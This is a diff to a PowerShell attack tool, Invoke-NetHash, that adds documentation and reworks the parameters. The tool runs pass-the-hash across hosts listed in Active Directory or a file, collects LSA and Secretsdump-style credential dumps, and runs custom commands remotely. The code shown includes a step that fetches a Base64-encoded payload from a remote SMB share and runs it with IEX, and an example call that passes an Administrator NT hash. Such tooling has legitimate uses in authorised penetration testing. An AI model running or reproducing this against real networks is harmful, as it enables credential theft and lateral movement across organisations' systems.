@@ -3587,10 +3587,98 @@ function global:Invoke-LSADump
 
 Function Invoke-NetHash
 {
+<#
+.SYNOPSIS
+Invoke-NetHash provides the possability to execute an Secretsdump like command execution on a range of hosts (by use of Invoke-SMBExec). Further it also could be used to collect LSA Dumps from a Client range. Next to the build in functions also custom commands can be used.
+
+Author: Sebastian Hoelzle 
+License: BSD 3-Clause
+
+.PARAMETER ActiveDirectory
+
+Can be set to $true to enable gathering of the targets from Active Directory 
+Please note: In case this will be set to $true and no additional limitation applied all computers will be targeted
+
+.PARAMETER ComputerDomain
+
+If sourcing is set to $true - required if sourcing need to be done in separate computer domain. If this parameter is not set and sourcing in the Active Directory is set to $true the domain of the current computer is used.
+
+.PARAMETER UserDomain
+
+Required if PtH is happening with a domain account.
+
+.PARAMETER Filter
+
+Custom LDAP Filter for sourcing within the Active Directory. If not set and sourcing is set to Active Directory the filter "(&(objectclass=Computer)(useraccountcontrol=4096))" is used.
+
+.PARAMETER GC
+
+In a multi-domain enviroment a separate Global Catalog can be provided if the sourcing in Active Directory is used 
+
+.PARAMETER Filebased
+
+If set to $true a file selection dialog will be opened to select the inputfile. The targets within the file need to be separated by ";".
+
+.PARAMETER Inputfile
+
+Parameter to provide path (full path required) to inputfile which contains targets. The targets within the file need to be separated by ";".
+
+.PARAMETER Hosts
+
+Parameter can be set to IP or Hostname of single host or multiple hosts. In case of multiple targets an array object is required.
+
+.PARAMETER Username
+
+Username for PtH - Please note the domain need to be provided by the Parameter "UserDomain". In case of local users no Userdomain is required.
+
+.PARAMETER Hash
+
+NT Hash of the user used for PtH
+
+.PARAMETER BackChannel
+
+Parameter to verfiy if result need to be transferred back. Default set to $true and required for the build in commands.
+
+.PARAMETER Command
+
+Parameter for custom commands 
+
+.PARAMETER WriteVerbose
+
+Parameter for increasing the verbosity of the script. Default set to $false
+
+.PARAMETER Threads
+
+Parameter to control how many threads are used for the job execution - default set to 2.
+Please note: Don´t get crazy with this parameter - big ranges will take time anyway - better slow and steady as fast and crashed.
+
+.PARAMETER WriteLog
+
+Parameter to indicated if a log file will be written - Default set to $false
+
+.PARAMETER LSADump
+
+Parameter to indicate if an Dump of the LSA process will be created - Default set to $false
+Please note: If this is set to $true - the BackChannel parameter need also be set to $true
+
+.PARAMETER PowerDump
+
+Parameter to indicate if the Powershell Version of Secretsdump - PowerDump will be executed - Default set to $false.
+Please note: If this is set to $true - the BackChannel parameter need also be set to $true.
+
+.EXAMPLE
+Execute a command.
+Invoke-NetHash -Hosts Client01 -Username 'Administrator' -Hash 'e19ccf75ee54e06b06a5907af13cef42' -Powerdump $true -BackChannel $true
+
+.LINK
+https://github.com/powerpointken/hasher
+
+#>
 [CmdletBinding()]
 param (
-    [Parameter()][string]$Source,
-    [Parameter()][string]$Domain,
+    [Parameter()][bool]$ActiveDirectory,
+    [Parameter()][string]$ComputerDomain,
+    [Parameter()][string]$UserDomain,
     [Parameter()][string]$Filter,
     [Parameter()][bool]$GC,
     [Parameter()][bool]$Filebased,
@@ -3598,8 +3686,7 @@ param (
     [Parameter()][string]$Hosts,
     [Parameter()][string]$Username,
     [Parameter()][string]$Hash,
-    [Parameter()][string]$Payload,
-    [Parameter()][bool]$BackChannel,
+    [Parameter()][bool]$BackChannel=$true,
     [Parameter()][string]$Command,
     [Parameter()][bool]$WriteVerbose=$false,
     [Parameter()][string]$Threads = 2,
@@ -3619,11 +3706,11 @@ else
     }
 
 
-# Example Invoke-NetHash -Hosts Client01 -Username 'Administrator' -Hash 'e19ccf75ee54e06b06a5907af13cef42' -Command "PowerDump" -BackChannel $true
+
 
 $Scriptlog = "TheHasher" + ((Get-Date -Format yyyyMMdd-hhmmss).tostring()) + ".txt"
 
-$Version = "0.5"
+$Version = "0.6"
 Function Write-Log
     {
     param($Result, $Message, $ScriptLog, $LogSource, $AddInformation,$Log)
@@ -3743,8 +3830,6 @@ Param (
             }
             else 
                 {
-
-                    
                     [string]$STRCommand = {Start-Process PowerShell -ArgumentList '$I=([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((Get-Content "\\%IP%\Exchange$\Payload1.txt"))));IEX $I'}
                     $STRCommand = $STRCommand.Replace("%IP%",$ShareIP)
                     $Command = [Scriptblock]::Create($STRCommand)
@@ -3809,12 +3894,12 @@ Write-Log -Log $WriteLog  -Result "Started" -Message "Based on the provided inpu
 
 $Computers = @()
 Write-Verbose -Message ("Sourcing of the Targets is started.")
-if($Source -eq "AD")
+if($ActiveDirectory -eq $true)
     {
         Write-Log -Log $WriteLog  -Result "Success" -Message "The SOURCE Parameter is set to - AD, so Computer Objects will be extracted from the active directory." -ScriptLog $Scriptlog -LogSource ""
-        if($Domain -ne $Null)
+        if($ComputerDomain -ne $Null)
             {
-                $root = $Domain
+                $root = $ComputerDomain
                 Write-Log -Log $WriteLog  -Result "Completed" -Message ("The DOMAIN Parameter is set so the search will extract computer objects from: " + $root) -ScriptLog $Scriptlog -LogSource ""
             }
         else 
@@ -4097,6 +4182,3 @@ elseif($BuiltInLSADump -eq $true)
     return $Dmps
     }
 }
-
-
-Invoke-LSADump
